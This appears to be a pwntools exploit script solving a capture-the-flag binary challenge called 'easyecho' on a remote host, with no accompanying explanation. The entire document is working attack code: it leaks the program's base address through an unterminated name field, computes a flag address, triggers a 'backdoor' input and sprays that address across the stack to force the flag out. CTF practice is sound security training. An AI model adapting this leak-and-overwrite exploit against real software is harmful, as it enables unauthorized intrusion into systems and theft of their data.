#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 0
if local:
    p = process('./easyecho')
else:
    p = remote('182.116.62.85', 24842)

#gdb.attach(p)

p.recvuntil('Please give me your name~\n')
p.sendline('A' * 0x10)
p.recvuntil('Welcome ' + 'A' * 0x10)
binary_base = u64(p.recv(6).ljust(8, '\x00')) - 0xcf0
info('binary_base = ' + hex(binary_base))
flag_addr = binary_base + 0x202040
info('flag_addr = ' + hex(flag_addr))
p.recvuntil('Input: ')
p.sendline('backdoor')
p.recvuntil('Input: ')
p.sendline(p64(flag_addr) * 0x100)
p.recvuntil('Input: ')
p.sendline('exitexit')

p.interactive()

